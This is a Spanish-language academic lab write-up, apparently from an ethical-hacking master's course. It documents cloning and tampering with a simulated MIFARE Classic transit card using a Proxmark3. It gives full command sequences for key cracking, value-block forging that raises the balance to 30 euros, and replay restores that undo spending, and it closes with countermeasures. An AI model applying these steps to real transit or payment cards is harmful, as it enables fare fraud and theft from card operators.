<h1 align="center">📡 Laboratorio RFID — Ingeniería Inversa con Proxmark3 Easy</h1>
<h2 align="center">Análisis, Modificación y Ataque de Repetición sobre MIFARE Classic 1K</h2>

<p align="center">
  <img src="https://img.shields.io/badge/Plataforma-Hardware_Lab-blueviolet?logo=hackthebox&logoColor=white" alt="Hardware Lab">
  <img src="https://img.shields.io/badge/Dificultad-Avanzado-red.svg" alt="Avanzado">
  <img src="https://img.shields.io/badge/Tecnología-RFID%2FNFC-informational?logo=nfc&logoColor=white" alt="RFID/NFC">
  <img src="https://img.shields.io/badge/Firmware-Iceman_Fork-darkgreen" alt="Iceman Firmware">
  <img src="https://img.shields.io/badge/Módulo-Hacking%20Ético-darkred.svg?logo=hackthebox&logoColor=white" alt="Hacking Ético">
  <img src="https://img.shields.io/badge/Grado-Máster%20en%20Ciberseguridad-gold.svg" alt="Máster Ciberseguridad">
</p>

<p align="center">
  <i>Laboratorio de ingeniería inversa sobre tarjeta de transporte público simulada. Se documenta el proceso completo de auditoría RFID: extracción de claves, análisis diferencial del mapa de memoria, modificación del saldo almacenado y explotación del ataque de repetición (Replay Attack) para demostrar la ausencia de mecanismos de validación en tiempo real.</i>
</p>

---

> [!WARNING]
> **Aviso Legal.** Este laboratorio ha sido realizado íntegramente sobre un entorno simulado con autorización expresa, con fines exclusivamente académicos. Ninguna de las técnicas aquí documentadas debe aplicarse sobre sistemas reales de transporte, control de acceso o pago sin el consentimiento explícito del propietario. La modificación no autorizada de tarjetas RFID en explotación constituye un delito. El autor declina toda responsabilidad por el uso irresponsable de esta documentación.

---

## 📑 Índice

1. [Resumen Ejecutivo](#-1-resumen-ejecutivo)
2. [Vectores de Ataque (OWASP / MITRE)](#-2-vectores-de-ataque-owasp--mitre)
3. [Herramientas y Material Necesario](#-3-herramientas-y-material-necesario)
4. [Fase 1 — Preparación del Entorno Debian](#-4-fase-1--preparación-del-entorno-debian)
5. [Fase 2 — Firmware Iceman: Compilación y Flasheo](#-5-fase-2--firmware-iceman-compilación-y-flasheo)
6. [Fase 3 — Primer Contacto y Extracción de Claves](#-6-fase-3--primer-contacto-y-extracción-de-claves)
7. [Fase 4 — Volcado Completo y Copia de Seguridad](#-7-fase-4--volcado-completo-y-copia-de-seguridad)
8. [Fase 5 — Análisis Diferencial y Localización del Saldo](#-8-fase-5--análisis-diferencial-y-localización-del-saldo)
9. [Fase 6 — Descifrado de la Lógica de Almacenamiento (Value Block)](#-9-fase-6--descifrado-de-la-lógica-de-almacenamiento-value-block)
10. [Fase 7 — Modificación Directa del Saldo](#-10-fase-7--modificación-directa-del-saldo)
11. [Fase 8 — Ataque de Repetición (Replay Attack)](#-11-fase-8--ataque-de-repetición-replay-attack)
12. [Fase 9 — Verificación y Confirmación](#-12-fase-9--verificación-y-confirmación)
13. [Vulnerabilidades y Contramedidas](#-13-vulnerabilidades-y-contramedidas)
14. [Conclusión](#-14-conclusión)
15. [Anexo: Referencia de Comandos](#-15-anexo-referencia-de-comandos)

---

## 📌 1. Resumen Ejecutivo

La tecnología **MIFARE Classic 1K**, desarrollada por NXP en los años 90, es el estándar de tarjetas de proximidad más extendido del mundo: se utiliza en sistemas de transporte público, control de acceso a edificios, monederos electrónicos y tarjetas universitarias. Su longevidad en el mercado convive con una realidad técnica incómoda: el algoritmo criptográfico propietario **CRYPTO-1** fue completamente roto por investigadores académicos en 2008, y sus vulnerabilidades son hoy perfectamente explotables con hardware comercial asequible.

Este laboratorio documenta el proceso completo de auditoría de una tarjeta MIFARE Classic 1K utilizada en un sistema de transporte simulado. El objetivo es técnico y didáctico: recorrer la cadena de ataque entera —desde la extracción de claves hasta la modificación del saldo y su restauración mediante un Replay Attack— para comprender en profundidad por qué estos sistemas son inseguros y qué medidas concretas los harían robustos.

El hardware empleado es una **Proxmark3 Easy** (clon genérico, firmware Iceman Fork), ejecutada sobre Debian Linux. No se requiere ningún conocimiento previo de electrónica.

**Resultado:** se consigue modificar el saldo almacenado en la tarjeta de 5,00 € a 30,00 € y restaurarlo indefinidamente tras cada uso, todo ello sin acceso al backend del sistema.

---

## 🎯 2. Vectores de Ataque (OWASP / MITRE)

| Vector | Clasificación | Descripción |
|:---|:---|:---|
| **Extracción de claves CRYPTO-1** | OWASP IoT Top 10 — I7 Insecure Data Transfer / MITRE T1212 | Ataque criptográfico (Nested/DarkSide) que rompe las claves de todos los sectores en segundos |
| **Modificación de datos en tarjeta** | OWASP IoT Top 10 — I3 Insecure Ecosystem Interfaces / MITRE T1565 | Escritura directa en bloques de memoria con permisos de escritura obtenidos previamente |
| **Replay Attack (ataque de repetición)** | MITRE T1550 — Use Alternate Authentication Material | Restauración del estado previo de la tarjeta (saldo + logs) para eludir el descuento registrado |
| **Ausencia de validación backend** | OWASP Top 10 — A01:2021 Broken Access Control | El lector no verifica el saldo contra un servidor central, aceptando cualquier valor escrito en la tarjeta |

---

## 🛠️ 3. Herramientas y Material Necesario

| Elemento | Descripción |
|:---|:---|
| **Proxmark3 Easy** | Clon genérico (512 KB, chip AT91SAM7S512) — lector/escritor RFID multifrecuencia |
| **Firmware Iceman Fork** | Implementación open-source del firmware de Proxmark3 con soporte completo de ataques MIFARE |
| **Tarjeta MIFARE Classic 1K** | UID `0BBAFE2A` — tarjeta de prueba de sistema de transporte simulado |
| **Debian Linux** | Sistema operativo del atacante (nativo o VM con passthrough USB directo) |
| `hf mf autopwn` | Comando Proxmark3 para extracción automática de todas las claves del sector |
| `hf mf dump` / `restore` | Volcado y restauración completa del mapa de memoria de la tarjeta |
| `hf mf wrbl` | Escritura directa en bloque específico con clave de autenticación |

---

## 💻 4. Fase 1 — Preparación del Entorno Debian

Antes de conectar la Proxmark3, se instalan las dependencias de compilación y se neutralizan los servicios que interfieren con la comunicación serie. El principal obstáculo es **ModemManager**: al detectar un dispositivo serie nuevo, intenta gestionarlo como un módem y bloquea el acceso del firmware.

```bash
sudo apt update
sudo apt install --no-install-recommends git ca-certificates build-essential pkg-config \
  libreadline-dev gcc-arm-none-eabi libnewlib-dev qtbase5-dev libbz2-dev \
  libbluetooth-dev libpython3-dev libssl-dev libgd-dev
```

Detención permanente de ModemManager:

```bash
sudo systemctl stop ModemManager
sudo systemctl disable ModemManager
```

Permisos de acceso al puerto USB sin elevar a root:

```bash
sudo usermod -aG dialout $USER
# Cerrar sesión y retomar para que los permisos tengan efecto
```

> [!NOTE]
> En máquinas virtuales es imprescindible configurar el **USB passthrough** del hipervisor para que la VM tenga acceso exclusivo al puerto USB de la Proxmark3. En VirtualBox: Dispositivos → USB → añadir filtro para "Proxmark".

---

## ⚙️ 5. Fase 2 — Firmware Iceman: Compilación y Flasheo

El firmware oficial de Proxmark3 es limitado. El **Iceman Fork** (RfidResearchGroup) implementa todos los ataques criptográficos modernos contra MIFARE y se mantiene activamente. Se compila específicamente para la placa genérica (`PM3GENERIC`):

```bash
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3
cp Makefile.platform.sample Makefile.platform
```

Editar `Makefile.platform` para seleccionar la plataforma correcta:

```makefile
#PLATFORM=PM3RDV4   ← comentar la línea del modelo oficial
PLATFORM=PM3GENERIC  ← activar el genérico
```

Compilación (usa todos los núcleos disponibles):

```bash
make clean
make -j$(nproc) all
```

Flasheo del firmware. **El dispositivo debe estar desconectado al iniciar el script**; solo se conecta cuando el script lo solicita:

```bash
./pm3-flash-all
```

> [!CAUTION]
> No desconectar el cable USB durante el flasheo (~2 minutos). Una interrupción en este punto puede dejar la placa en estado de brick y requerir un rescate por JTAG.

---

## 📡 6. Fase 3 — Primer Contacto y Extracción de Claves

Con el firmware instalado, se inicia el cliente de Proxmark3:

```bash
./pm3
```

El prompt cambia a `[usb] pm3 -->`. La tarjeta se apoya sobre la antena HF (rectangular, para 13,56 MHz) y se lanza la detección:

```bash
[usb] pm3 --> hf search
```

La tarjeta se identifica como **MIFARE Classic 1K** con UID `0BBAFE2A`. A continuación se ejecuta el ataque automático de extracción de claves:

```bash
[usb] pm3 --> hf mf autopwn
```

`autopwn` encadena automáticamente los ataques disponibles —**DarkSide** (cuando la clave del sector 0 es desconocida) y **Nested Authentication** (para el resto de sectores una vez obtenida la primera clave)— hasta cubrir los 16 sectores completos. El proceso tarda entre 30 segundos y 3 minutos dependiendo del estado inicial de la tarjeta.

Al finalizar, el directorio de trabajo contiene tres ficheros:

| Fichero | Contenido |
|:---|:---|
| `hf-mf-0BBAFE2A-dump.bin` | Volcado binario completo de los 64 bloques (1 KB) |
| `hf-mf-0BBAFE2A-dump.json` | Claves A y B de todos los sectores + metadatos |
| `hf-mf-0BBAFE2A-key.bin` | Claves en formato binario puro |

> [!NOTE]
> El ataque **Nested Authentication** funciona porque CRYPTO-1 genera keystreams predecibles cuando se conoce al menos una clave de sector. A partir de una sola clave (frecuentemente la predeterminada `FFFFFFFFFFFF`), el ataque puede inferir las claves de todos los demás sectores con pocas decenas de autenticaciones.

---

## 💾 7. Fase 4 — Volcado Completo y Copia de Seguridad

Antes de cualquier modificación, se obtiene una "fotografía" del estado original de la tarjeta (saldo: **5,00 €**). Este volcado servirá como referencia para el análisis diferencial posterior:

```bash
[usb] pm3 --> hf mf dump --1k
[usb] pm3 --> !cp hf-mf-0BBAFE2A-dump.bin tarjeta_original_5e.bin
[usb] pm3 --> !cp hf-mf-0BBAFE2A-dump.json tarjeta_original_5e.json
```

*(El prefijo `!` permite ejecutar comandos del sistema operativo directamente desde la consola interactiva de Proxmark3.)*

---

## 🔍 8. Fase 5 — Análisis Diferencial y Localización del Saldo

El objetivo de esta fase es identificar en qué bloque exacto del mapa de memoria se almacena el saldo, sin conocimiento previo de la lógica del sistema.

**Metodología:**

1. Se usa la tarjeta en el lector simulado para descontar un viaje: el saldo pasa de **5,00 €** a **4,17 €**.
2. Se realiza un segundo volcado completo: `viaje_gastado.bin`.
3. Se comparan ambos volcados visualmente:

```bash
[usb] pm3 --> hf mf view -f tarjeta_original_5e.bin
[usb] pm3 --> hf mf view -f viaje_gastado.bin
```

**Resultado del análisis diferencial:**

Los únicos bloques que cambian entre los dos volcados son los **bloques 37 y 38** del sector 9, y algunos bloques de los sectores 10 y 12 (registros de log de transacciones). El saldo vive en el sector 9.

| Volcado | Bloque 37 (hex) | Interpretación |
|:---|:---|:---|
| Original (5,00 €) | `E8 03 00 00 17 FC FF FF E8 03 00 00 00 FF 00 FF` | Valor 0x03E8 = 1000 |
| Gastado (4,17 €) | `43 03 00 00 BC FC FF FF 43 03 00 00 00 FF 00 FF` | Valor 0x0343 = 835 |

---

## 🧮 9. Fase 6 — Descifrado de la Lógica de Almacenamiento (Value Block)

Con los valores extraídos, se descifra la lógica de codificación del sistema:

- **5,00 €** = 500 céntimos × 2 = **1000** = `0x03E8` → little-endian `E8 03 00 00` ✅
- **4,17 €** = 417 céntimos × 2 = **834** = `0x0342` → el sistema guardó `0x0343` (835), posible redondeo interno.

El sistema almacena el saldo como el **doble del valor en céntimos**, codificado en little-endian de 4 bytes.

El bloque sigue el formato estándar **Value Block** de la especificación MIFARE:

| Bytes | Contenido |
|:---|:---|
| **0–3** | Valor en little-endian |
| **4–7** | Complemento a 1 del valor (NOT byte a byte) |
| **8–11** | Valor en little-endian (repetición de verificación) |
| **12–15** | Dirección del bloque y su inverso |

Esta estructura de triple redundancia está diseñada para detectar corrupción accidental, pero **no protege contra escritura maliciosa deliberada**: si el atacante conoce la fórmula, puede construir un Value Block válido para cualquier valor arbitrario.

---

## ✍️ 10. Fase 7 — Modificación Directa del Saldo

**Objetivo:** establecer un saldo de **30,00 €**.

**Cálculo:**
```
30,00 € = 3000 céntimos × 2 = 6000 = 0x1770 → little-endian: 70 17 00 00
NOT(70 17 00 00) = 8F E8 FF FF
```

**Value Block completo:** `70 17 00 00  8F E8 FF FF  70 17 00 00  00 FF 00 FF`

El sector 9 tiene dos claves (extraídas en la Fase 3):
- **Clave A** (`99100225D83B`): solo lectura
- **Clave B** (`3FC7D24E89EE`): permisos de escritura sobre bloques 37 y 38

Escritura con autenticación por Clave B:

```bash
[usb] pm3 --> hf mf wrbl --blk 37 -b -k 3FC7D24E89EE -d 701700008FE8FFFF7017000000FF00FF
[usb] pm3 --> hf mf wrbl --blk 38 -b -k 3FC7D24E89EE -d 701700008FE8FFFF7017000000FF00FF
```

Verificación inmediata con lectura autenticada por Clave A:

```bash
[usb] pm3 --> hf mf rdbl --blk 37 -k 99100225D83B
```

La salida confirma `70 17 00 00 8F E8 FF FF 70 17 00 00 00 FF 00 FF`. El saldo ahora es **30,00 €** en la memoria de la tarjeta.

---

## 🔁 11. Fase 8 — Ataque de Repetición (Replay Attack)

La modificación manual del saldo es efectiva, pero requiere recalcular el Value Block cada vez. El **Replay Attack** es más elegante: consiste en conservar un volcado completo del estado deseado y restaurarlo íntegramente después de cada uso.

**Paso 1:** Con la tarjeta en estado de 30,00 €, se realiza un volcado completo y se guarda:

```bash
[usb] pm3 --> hf mf dump --1k
[usb] pm3 --> !mv hf-mf-0BBAFE2A-dump.bin  saldo30.bin
[usb] pm3 --> !mv hf-mf-0BBAFE2A-dump.json saldo30.json
```

**Paso 2:** Tras usar la tarjeta (por ejemplo, el saldo cae a 25,00 €), se restaura el estado completo:

```bash
[usb] pm3 --> hf mf restore --1k --file saldo30.bin
```

El comando `restore` utiliza el fichero `.json` asociado para autenticarse en cada sector y rescribe los 64 bloques de la tarjeta. En pocos segundos, **tanto el saldo como los registros de log quedan en el estado del momento del volcado**: para el lector, la tarjeta parece no haber sido usada nunca desde entonces.

> [!IMPORTANT]
> Este ataque es posible precisamente porque el sistema simulado **no valida el estado de la tarjeta contra un registro central**. En un sistema bien diseñado, el lector consultaría el número de transacción (contador de secuencia) con el servidor backend antes de aceptar el pago, detectando inmediatamente la inconsistencia temporal.

---

## ✅ 12. Fase 9 — Verificación y Confirmación

Comprobación del bloque 37 tras la restauración:

```bash
[usb] pm3 --> hf mf rdbl --blk 37 -k 99100225D83B
```

**Salida esperada:** `70 17 00 00 8F E8 FF FF 70 17 00 00 00 FF 00 FF`

Para una verificación más exhaustiva, se puede realizar un volcado completo y compararlo byte a byte con el fichero `saldo30.bin`:

```bash
[usb] pm3 --> hf mf dump --1k
[usb] pm3 --> !diff hf-mf-0BBAFE2A-dump.bin saldo30.bin
```

Un `diff` sin salida confirma que la tarjeta es bit a bit idéntica al estado de 30,00 €.

---

## 🛡️ 13. Vulnerabilidades y Contramedidas

### Vulnerabilidades demostradas

| Vulnerabilidad | Impacto | Detalle Técnico |
|:---|:---:|:---|
| **CRYPTO-1 roto** | 🔴 Crítico | Todas las claves de los 16 sectores se extraen en < 3 min con hardware de ~30€ |
| **Saldo en tarjeta, no en servidor** | 🔴 Crítico | El valor de referencia reside en la tarjeta; el lector lo acepta sin validar |
| **Value Block predecible** | 🟠 Alto | La estructura triple-redundante es reversible; cualquier saldo es construible si se conoce la clave B |
| **Logs en tarjeta restaurables** | 🟠 Alto | Los registros de transacción se sobreescriben con el volcado, ocultando el ataque |
| **Sin contador de secuencia** | 🟠 Alto | El sistema no implementa contadores MAC ni nonces de sesión |

### Contramedidas efectivas

1. **Migrar a MIFARE DESFire EV2/EV3**: criptografía AES-128 con autenticación mutua y diversificación de claves por tarjeta. CRYPTO-1 es irrecuperable en entornos de alta seguridad.
2. **Validación backend de cada transacción**: el lector consulta al servidor el último contador conocido antes de aceptar el descuento. Un contador que retrocede es inmediatamente sospechoso.
3. **Contadores de transacción no reversibles (MAC)**: implementar un contador de sesión firmado que el servidor incrementa y la tarjeta no puede decrementar.
4. **Claves únicas por tarjeta y rotación periódica**: la diversificación de claves impide que comprometer una tarjeta exponga las claves del sistema completo.
5. **Detección de anomalías en el log del servidor**: patrones de comportamiento inusuales (saldos que se repiten, logs que no progresan) deben disparar alertas automáticas.

---

## ✅ 14. Conclusión

Este laboratorio demuestra que la seguridad de un sistema de pago o control de acceso no puede descansar exclusivamente en la tarjeta. Una tarjeta MIFARE Classic 1K, por muy bien configurada que esté su estructura de bloques, es criptográficamente insegura desde 2008: sus claves son extraíbles en minutos con hardware accesible, y sus datos son modificables en segundos una vez conocidas esas claves.

El vector más crítico no es la modificación del saldo per se, sino el **Replay Attack**: la capacidad de restaurar un estado anterior de la tarjeta —incluyendo los registros de log— hace indetectable la manipulación para un sistema que no sincronice su estado con un servidor externo.

La lección de sistemas embebidos es inmutable: **la seguridad de un protocolo no puede depender únicamente del secreto de la clave**. CRYPTO-1 fue diseñado en secreto y su seguridad dependía de que nadie lo estudiara. En cuanto los investigadores lo publicaron (Nohl et al., 2008), todo el ecosistema quedó expuesto.

### 📚 Bibliografía y Referencias

- [Nohl et al. — Reverse-Engineering a Cryptographic RFID Tag (USENIX Security 2008)](https://www.usenix.org/conference/usenix-security-08/reverse-engineering-cryptographic-rfid-tag)
- [RfidResearchGroup — Iceman Proxmark3 Firmware](https://github.com/RfidResearchGroup/proxmark3)
- [OWASP IoT Top 10 — IoT Security](https://owasp.org/www-project-internet-of-things/)
- [MITRE ATT&CK — T1565: Data Manipulation](https://attack.mitre.org/techniques/T1565/)
- [MITRE ATT&CK — T1550: Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)
- [NXP — MIFARE Classic EV1 Datasheet](https://www.nxp.com/docs/en/data-sheet/MF1S50YYX_V1.pdf)

---

## 📋 15. Anexo: Referencia de Comandos

| Acción | Comando Proxmark3 |
|:---|:---|
| Iniciar cliente | `./pm3` |
| Detectar tarjeta HF | `hf search` |
| Extracción automática de claves + dump | `hf mf autopwn` |
| Volcado completo 1K | `hf mf dump --1k` |
| Visualizar volcado en hex | `hf mf view -f archivo.bin` |
| Leer bloque con clave A | `hf mf rdbl --blk 37 -k 99100225D83B` |
| Escribir bloque con clave B | `hf mf wrbl --blk 37 -b -k 3FC7D24E89EE -d <hex16bytes>` |
| Restaurar volcado completo | `hf mf restore --1k --file saldo30.bin` |
| Ejecutar comando del SO | `!comando` (ej. `!ls`, `!diff a.bin b.bin`) |
| Comparar volcados (sistema) | `!diff archivo1.bin archivo2.bin` |

---

<hr>
<p align="center">
  <i>Laboratorio elaborado como parte del módulo de Hacking Ético — Máster en Ciberseguridad.<br>
  Realizado sobre entorno simulado con autorización expresa, con fines exclusivamente académicos.</i>
  <br><br>
  <b>Gabriel Godoy Alfaro</b>
</p>
